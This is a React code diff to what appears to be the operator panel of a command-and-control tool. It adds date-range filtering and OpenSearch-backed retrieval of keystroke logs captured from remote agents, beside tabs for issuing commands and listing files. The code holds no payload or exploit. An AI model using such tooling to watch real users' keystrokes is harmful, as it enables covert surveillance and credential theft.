@@ -10,11 +10,14 @@ const Agent = () => {
   const [error, setError] = useState(null);
 
   const [data, setData] = useState(null);
+  const [loading, setLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('commands');
   
   // States related to commands tab
   const [commands, setCommands] = useState([]);
   const [keylogs, setKeylogs] = useState([]);
+  const [keylogRangeDays, setKeylogRangeDays] = useState(1);
+  const [keylogTotal, setKeylogTotal] = useState(0);
   const [newCommand, setNewCommand] = useState('');
   const commandListRef = useRef(null);
   const [isAtBottom, setIsAtBottom] = useState(true);
@@ -63,11 +66,13 @@ const Agent = () => {
     }
 
     try {
+      if (!data) {
+        setLoading(true);
+      }
       const queryParam = getQueryParam('agt');
       const agentResponse = await axios.get(`/api/agent/${queryParam}`);
       const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
       const filesResponse = await axios.get(`/api/files/list/${queryParam}`);
-      const keylogsResponse = await axios.get(`/api/keylog/${queryParam}`);
       const notesResponse = await axios.get(`/api/notes/${queryParam}`);
       const tagsResponse = await axios.get(`/api/tags/${queryParam}`);
       const tagsData = tagsResponse.data.tags;
@@ -81,7 +86,7 @@ const Agent = () => {
         setCallbackJitter(responseData.callbackjitter || '');
         setTransportProtocol(responseData.transportprotocol || '');
       } else {
-        setError('No data found');
+        setData(null);
       }
 
       if (commandsResponse.data.data) {
@@ -118,10 +123,8 @@ const Agent = () => {
       } else {
         setFiles([])
       }
-      if (keylogsResponse.data.data) {
-        setKeylogs(keylogsResponse.data.data);
-      } else {
-        setKeylogs([]);
+      if (activeTab === 'keys') {
+        fetchKeylogs(queryParam);
       }
       setNotes(notesResponse.data?.data?.note ?? '');
       if (Array.isArray(tagsData)) {
@@ -131,6 +134,33 @@ const Agent = () => {
       }
     } catch (err) {
       setError(err.message);
+    } finally {
+      if (!data) {
+        setLoading(false);
+      }
+    }
+  };
+
+  const fetchKeylogs = async (uuid) => {
+    try {
+      const nowIso = new Date().toISOString();
+      const params = {
+        uuid,
+        sort: 'created_at:desc',
+        limit: 200
+      };
+      if (keylogRangeDays > 0) {
+        const start = new Date(Date.now() - keylogRangeDays * 24 * 60 * 60 * 1000).toISOString();
+        params.start = start;
+        params.end = nowIso;
+      }
+      const response = await axios.get('/api/opensearch/keylogs', { params });
+      const hits = response?.data?.data || [];
+      setKeylogTotal(response?.data?.total?.value || 0);
+      setKeylogs(hits.map(hit => hit._source || {}));
+    } catch (err) {
+      setKeylogs([]);
+      setKeylogTotal(0);
     }
   };
   
@@ -199,6 +229,13 @@ const Agent = () => {
 
     return () => clearInterval(interval);
   }, [location.search, activeTab]);
+
+  useEffect(() => {
+    if (activeTab !== 'keys') return;
+    const queryParam = getQueryParam('agt');
+    if (!queryParam) return;
+    fetchKeylogs(queryParam);
+  }, [activeTab, keylogRangeDays, location.search]);
 
   useEffect(() => {
     const id = setInterval(() => setNow(Date.now()), 1000);
@@ -282,6 +319,10 @@ const Agent = () => {
 
   if (error) {
     return <div>Error: {error}</div>;
+  }
+
+  if (loading) {
+    return <p>Loading agent data...</p>;
   }
 
   if (!data) {
@@ -437,30 +478,49 @@ const Agent = () => {
 
   const renderKeylogsTab = () => (
     <div className="keylogs-list">
-      <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
-        {keylogs.length === 0 ? (
-          <p>No keylogs available.</p>
-        ) : (
-          <ul>
-            {keylogs.map((keylog) => {
-              const formattedTime = new Date(keylog.created_at).toLocaleString();
-
-              return (
-                <li key={keylog.keylog_id}>
-                  <div className="keylog-entry">
-                    <div className="keylog-meta">
-                      <span className="keylog-time">{formattedTime}</span>
-                    </div>
-                    <div className="keylog-content">
-                      {keylog.contents || "No keylogs recorded"}
-                    </div>
-                  </div>
-                </li>
-              );
-            })}
-          </ul>
-        )}
+      <div className="keylogs-filters">
+        <label htmlFor="keylogRange">Range</label>
+        <select
+          id="keylogRange"
+          value={keylogRangeDays}
+          onChange={(e) => {
+            const next = Number(e.target.value);
+            setKeylogRangeDays(next);
+            const queryParam = getQueryParam('agt');
+            if (activeTab === 'keys' && queryParam) {
+              fetchKeylogs(queryParam);
+            }
+          }}
+        >
+          <option value={1}>Last 24 hours</option>
+          <option value={7}>Last 7 days</option>
+          <option value={30}>Last 30 days</option>
+          <option value={0}>All time</option>
+        </select>
+        <span className="keylogs-meta">Total: {keylogTotal}</span>
       </div>
+      {keylogs.length === 0 ? (
+        <p>No keylogs available.</p>
+      ) : (
+        <ul>
+          {keylogs.map((keylog) => {
+            const formattedTime = new Date(keylog.created_at).toLocaleString();
+
+            return (
+              <li key={keylog.keylog_id || keylog.created_at}>
+                <div className="keylog-entry">
+                  <div className="keylog-meta">
+                    <span className="keylog-time">{formattedTime}</span>
+                  </div>
+                  <div className="keylog-content">
+                    {keylog.contents || "No keylogs recorded"}
+                  </div>
+                </div>
+              </li>
+            );
+          })}
+        </ul>
+      )}
     </div>
   );
 
